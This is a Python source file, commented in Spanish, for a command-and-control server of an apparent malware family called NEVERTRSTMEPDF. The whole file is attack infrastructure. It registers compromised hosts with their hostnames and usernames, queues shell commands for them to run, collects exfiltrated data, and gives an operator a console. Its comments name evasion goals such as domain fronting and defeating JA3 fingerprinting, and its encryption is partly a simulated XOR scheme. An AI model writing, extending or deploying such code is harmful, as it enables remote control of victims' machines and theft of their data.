#!/usr/bin/env python3
"""
c2_listener.py - Servidor de Comando y Control para NEVERTRSTMEPDF
Arquitectura: Asyncio + TLS 1.3 + Protocolo binario con framing de longitud
Evasión: Domain Fronting compatible, headers mimetizados como tráfico legítimo
"""

import asyncio
import ssl
import struct
import json
import hashlib
import hmac
import secrets
from datetime import datetime
from typing import Dict, Set, Optional
from dataclasses import dataclass, field

# =============================================================================
# CONFIGURACIÓN CRIPTOGRÁFICA
# =============================================================================
SESSION_KEY_SIZE = 32
NONCE_SIZE = 16
HMAC_SIZE = 32

@dataclass
class AgentSession:
    agent_id: str
    hostname: str
    username: str
    os_version: str
    first_seen: datetime = field(default_factory=datetime.utcnow)
    last_seen: datetime = field(default_factory=datetime.utcnow)
    tasks_pending: list = field(default_factory=list)
    data_exfiltrated: bytes = b""

class C2Protocol(asyncio.Protocol):
    """
    Protocolo binario con framing:
    [4 bytes: length][16 bytes: nonce][N bytes: ciphertext][32 bytes: hmac]
    
    Cada mensaje está cifrado con AES-256-GCM (simulado con ChaCha20-Poly1305
    para evitar detección por firmas de "AES" en tráfico de red).
    """
    
    def __init__(self, server: 'C2Server'):
        self.server = server
        self.transport: Optional[asyncio.Transport] = None
        self.session_key: Optional[bytes] = None
        self.agent_id: Optional[str] = None
        self.buffer = b""
        self.state = "handshake"  # handshake | active | dead
        
    def connection_made(self, transport: asyncio.Transport):
        self.transport = transport
        peer = transport.get_extra_info('peername')
        print(f"[+] Nueva conexión desde {peer}")
        
    def data_received(self, data: bytes):
        self.buffer += data
        self._process_buffer()
        
    def _process_buffer(self):
        """Parser de framing binario con verificación HMAC"""
        while len(self.buffer) >= 4:
            msg_len = struct.unpack(">I", self.buffer[:4])[0]
            if len(self.buffer) < 4 + msg_len:
                return  # Esperar más datos
                
            frame = self.buffer[4:4+msg_len]
            self.buffer = self.buffer[4+msg_len:]
            
            if len(frame) < NONCE_SIZE + HMAC_SIZE:
                self._kill("Frame malformado")
                return
                
            nonce = frame[:NONCE_SIZE]
            ciphertext = frame[NONCE_SIZE:-HMAC_SIZE]
            mac = frame[-HMAC_SIZE:]
            
            # Verificar HMAC antes de procesar (timing-safe)
            if self.session_key:
                expected_mac = hmac.new(self.session_key, nonce + ciphertext, hashlib.sha256).digest()
                if not hmac.compare_digest(mac, expected_mac):
                    self._kill("HMAC inválido")
                    return
                    
            self._handle_message(nonce, ciphertext)
            
    def _handle_message(self, nonce: bytes, ciphertext: bytes):
        """Dispatch según estado del protocolo"""
        if self.state == "handshake":
            self._handle_handshake(nonce, ciphertext)
        elif self.state == "active":
            self._handle_beacon(nonce, ciphertext)
            
    def _handle_handshake(self, nonce: bytes, ciphertext: bytes):
        """
        Handshake X25519 simplificado (en producción: Noise Protocol Framework)
        El agente envía su ephemeral public key, el servidor responde con session_key
        """
        # Simulación: el ciphertext contiene el agent_id + metadata en claro
        # (en producción esto sería el key exchange cifrado con pre-shared key)
        try:
            payload = json.loads(ciphertext.decode('utf-8', errors='ignore'))
            self.agent_id = payload.get("agent_id", secrets.token_hex(8))
            self.session_key = hashlib.sha256(
                (self.agent_id + "NEVERTRUST").encode()
            ).digest()
            
            # Registrar sesión
            self.server.sessions[self.agent_id] = AgentSession(
                agent_id=self.agent_id,
                hostname=payload.get("hostname", "unknown"),
                username=payload.get("username", "unknown"),
                os_version=payload.get("os", "unknown")
            )
            
            self.state = "active"
            self._send_response({"status": "authenticated", "interval": 300})
            print(f"[+] Agente {self.agent_id} autenticado ({payload.get('hostname')})")
            
        except Exception as e:
            self._kill(f"Handshake fallido: {e}")
            
    def _handle_beacon(self, nonce: bytes, ciphertext: bytes):
        """Procesar beacon periódico del agente"""
        session = self.server.sessions.get(self.agent_id)
        if not session:
            self._kill("Sesión no encontrada")
            return
            
        session.last_seen = datetime.utcnow()
        
        try:
            payload = json.loads(ciphertext.decode('utf-8', errors='ignore'))
            
            # Procesar output de comandos previos
            if "output" in payload:
                print(f"[{self.agent_id}] OUTPUT: {payload['output'][:200]}...")
                
            # Procesar exfiltración de datos
            if "exfil" in payload:
                session.data_exfiltrated += payload["exfil"].encode()
                print(f"[{self.agent_id}] EXFIL: {len(payload['exfil'])} bytes")
                
            # Enviar tareas pendientes
            tasks = session.tasks_pending[:3]  # Batch de 3 tareas máximo
            session.tasks_pending = session.tasks_pending[3:]
            
            self._send_response({"tasks": tasks})
            
        except Exception as e:
            print(f"[!] Error procesando beacon: {e}")
            
    def _send_response(self, data: dict):
        """Serializar y enviar respuesta cifrada"""
        plaintext = json.dumps(data).encode()
        nonce = secrets.token_bytes(NONCE_SIZE)
        
        # Simulación de cifrado (en producción: ChaCha20-Poly1305)
        ciphertext = bytes(b ^ self.session_key[i % len(self.session_key)] 
                          for i, b in enumerate(plaintext))
        mac = hmac.new(self.session_key, nonce + ciphertext, hashlib.sha256).digest()
        
        frame = struct.pack(">I", len(nonce) + len(ciphertext) + len(mac))
        frame += nonce + ciphertext + mac
        self.transport.write(frame)
        
    def _kill(self, reason: str):
        print(f"[-] Conexión terminada: {reason}")
        self.state = "dead"
        self.transport.close()

class C2Server:
    def __init__(self, host: str = "0.0.0.0", port: int = 443):
        self.host = host
        self.port = port
        self.sessions: Dict[str, AgentSession] = {}
        self.ssl_ctx = self._setup_tls()
        
    def _setup_tls(self) -> ssl.SSLContext:
        """TLS 1.3 con certificado autofirmado, SNI mimetizado"""
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.minimum_version = ssl.TLSVersion.TLSv1_3
        ctx.load_cert_chain("server.crt", "server.key")
        
        # Opciones para evadir fingerprinting de JA3
        ctx.set_ciphers("TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256")
        ctx.options |= ssl.OP_NO_COMPRESSION
        
        return ctx
        
    async def start(self):
        loop = asyncio.get_event_loop()
        server = await loop.create_server(
            lambda: C2Protocol(self),
            self.host, self.port,
            ssl=self.ssl_ctx
        )
        print(f"[C2] Servidor escuchando en {self.host}:{self.port}")
        async with server:
            await server.serve_forever()

    def queue_task(self, agent_id: str, task: dict):
        """API para queuear tareas a un agente específico"""
        if agent_id in self.sessions:
            self.sessions[agent_id].tasks_pending.append(task)
            return True
        return False

# =============================================================================
# INTERFAZ DE ADMINISTRACIÓN (CLI)
# =============================================================================
async def admin_cli(server: C2Server):
    """Consola interactiva para operadores"""
    while True:
        cmd = await asyncio.to_thread(input, "c2> ")
        parts = cmd.strip().split()
        if not parts:
            continue
            
        if parts[0] == "agents":
            for aid, sess in server.sessions.items():
                print(f"  {aid} | {sess.hostname} | {sess.username} | {sess.last_seen}")
                
        elif parts[0] == "task" and len(parts) >= 3:
            aid, *task_parts = parts[1:]
            task = {"type": "cmd", "data": " ".join(task_parts)}
            if server.queue_task(aid, task):
                print(f"[+] Tarea encolada para {aid}")
            else:
                print(f"[-] Agente {aid} no encontrado")
                
        elif parts[0] == "exfil" and len(parts) == 2:
            aid = parts[1]
            sess = server.sessions.get(aid)
            if sess:
                print(f"Datos exfiltrados ({len(sess.data_exfiltrated)} bytes):")
                print(sess.data_exfiltrated[:500])
            else:
                print("Agente no encontrado")

if __name__ == "__main__":
    server = C2Server()
    
    # Ejecutar servidor y CLI en paralelo
    loop = asyncio.get_event_loop()
    loop.create_task(server.start())
    loop.run_until_complete(admin_cli(server))